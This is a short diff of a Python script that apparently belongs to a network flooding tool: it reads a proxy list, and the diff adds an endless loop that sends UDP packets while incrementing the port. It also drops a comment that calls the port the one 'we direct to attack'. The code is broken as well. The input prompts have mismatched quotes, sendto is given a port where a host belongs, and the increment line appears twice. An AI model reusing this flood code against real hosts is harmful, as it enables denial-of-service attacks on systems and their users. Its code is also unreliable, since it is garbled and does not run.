@@ -339,9 +339,12 @@ proxyf = in_file.read()
 in_file.close()
 
 port = input("Port ( 80 ) : ')
-port = input("Port ( 53 ) : ')#Port we direct to attack
+port = input("Port ( 53 ) : ')
 
-
+while True:
+     sock.sendto(bytes, (port,port))
+     port = port + 1
+     port = port + 1
 	   
 listaproxy = proxyf.split('\n')
 #So luong
